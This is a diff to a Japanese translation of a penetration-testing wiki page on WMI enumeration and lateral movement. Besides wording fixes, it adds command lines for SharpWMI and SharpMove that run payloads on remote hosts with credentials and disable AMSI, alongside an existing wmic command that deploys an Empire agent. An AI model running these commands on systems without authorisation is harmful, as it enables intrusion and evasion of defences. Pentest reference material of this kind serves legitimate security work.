@@ -6,7 +6,7 @@
 
 ユーザー名とパスワードまたはハッシュが知られているホスト上でプロセスを開くことができます。WMIを使用してコマンドが実行され、Wmiexecによってセミインタラクティブなシェル体験が提供されます。
 
-**dcomexec.py:** 異なるDCOMエンドポイントを利用して、このスクリプトはwmiexec.pyに似たセミインタラクティブなシェルを提供し、特にShellBrowserWindow DCOMオブジェクトを活用しています。現在、MMC20、Application、Shell Windows、およびShell Browser Windowオブジェクトをサポートしています。(source: [Hacking Articles](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/))
+**dcomexec.py:** 異なるDCOMエンドポイントを利用して、このスクリプトはwmiexec.pyに似たセミインタラクティブなシェルを提供し、特にShellBrowserWindow DCOMオブジェクトを活用しています。現在、MMC20.アプリケーション、シェルウィンドウ、およびシェルブラウザウィンドウオブジェクトをサポートしています。(source: [Hacking Articles](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/))
 
 ## WMIの基本
 
@@ -31,7 +31,7 @@ gwmi -Namespace "root/microsoft" -List -Recurse
 ```
 ### **クラス**
 
-WMIクラス名（例：win32_process）とその存在する名前空間を知ることは、すべてのWMI操作において重要です。  
+WMIクラス名（例：win32_process）と、それが存在する名前空間を知ることは、すべてのWMI操作において重要です。  
 `win32`で始まるクラスをリストするためのコマンド：
 ```bash
 Get-WmiObject -Recurse -List -class win32* | more # Defaults to "root\cimv2"
@@ -45,7 +45,7 @@ Get-WmiObject -Namespace "root/microsoft/windows/defender" -Class MSFT_MpCompute
 ```
 ### 方法
 
-メソッドは、WMI クラスの 1 つ以上の実行可能な関数であり、実行できます。
+WMI クラスの 1 つ以上の実行可能な関数であるメソッドは、実行できます。
 ```bash
 # Class loading, method listing, and execution
 $c = [wmiclass]"win32_share"
@@ -85,26 +85,42 @@ wmic useraccount list /format:list
 wmic group list /format:list
 wmic sysaccount list /format:list
 ```
-WMIを使用して特定の情報、例えばローカル管理者やログオンユーザーをリモートで照会することは、慎重なコマンド構築によって実現可能です。
+WMIを使用して特定の情報、例えばローカル管理者やログイン中のユーザーをリモートで照会することは、慎重なコマンド構築によって実現可能です。
 
 ### **手動リモートWMI照会**
 
-リモートマシン上のローカル管理者やログオンユーザーを stealthy に特定することは、特定のWMIクエリを通じて達成できます。`wmic`は、複数のノードでコマンドを同時に実行するためにテキストファイルからの読み取りもサポートしています。
+リモートマシン上のローカル管理者やログイン中のユーザーを stealthy に特定することは、特定のWMIクエリを通じて達成できます。`wmic`は、複数のノードでコマンドを同時に実行するためにテキストファイルからの読み取りもサポートしています。
 
-WMIを介してプロセスをリモートで実行するためには、Empireエージェントを展開するなど、以下のコマンド構造が使用され、成功した実行は戻り値「0」で示されます。
+WMIを介してプロセスをリモートで実行するためには、Empireエージェントを展開するなど、以下のコマンド構造が使用され、成功した実行は戻り値「0」で示されます：
 ```bash
 wmic /node:hostname /user:user path win32_process call create "empire launcher string here"
 ```
 このプロセスは、リモート実行とシステム列挙のためのWMIの能力を示しており、システム管理とペネトレーションテストの両方におけるその有用性を強調しています。
 
-## References
-
-- [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
-
-## Automatic Tools
+## 自動ツール
 
 - [**SharpLateral**](https://github.com/mertdas/SharpLateral):
 ```bash
 SharpLateral redwmi HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe
 ```
+- [**SharpWMI**](https://github.com/GhostPack/SharpWMI)
+```bash
+SharpWMI.exe action=exec [computername=HOST[,HOST2,...]] command=""C:\\temp\\process.exe [args]"" [amsi=disable] [result=true]
+# Stealthier execution with VBS
+SharpWMI.exe action=executevbs [computername=HOST[,HOST2,...]] [script-specification] [eventname=blah] [amsi=disable] [time-specs]
+```
+- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):
+```bash
+SharpMove.exe action=query computername=remote.host.local query="select * from win32_process" username=domain\user password=password
+SharpMove.exe action=create computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true username=domain\user password=password
+SharpMove.exe action=executevbs computername=remote.host.local eventname=Debug amsi=true username=domain\\user password=password
+```
+- **Impacketの`wmiexec`**を使用することもできます。
+
+
+## 参考文献
+
+- [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
+
+
 {{#include ../../banners/hacktricks-training.md}}
